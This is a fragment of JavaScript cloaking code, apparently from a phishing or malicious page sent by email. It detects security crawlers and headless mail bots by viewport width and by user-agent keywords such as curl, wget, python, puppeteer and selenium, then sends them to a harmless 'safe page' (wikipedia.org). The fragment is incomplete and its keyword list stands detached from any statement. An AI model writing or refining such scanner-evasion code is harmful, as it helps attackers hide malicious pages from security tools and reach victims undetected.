            const SAFE_PAGE = "https://wikipedia.org"; // Where security crawlers are trapped

            // Headless mail bots often run checks with 0px views or invisible window hooks
            const viewWidth = window.innerWidth || document.documentElement.clientWidth || 0;

                'python', 'requests', 'curl', 'wget', 'http-client', 'go-http', 
                'headless', 'puppeteer', 'selenium', 'playwright'
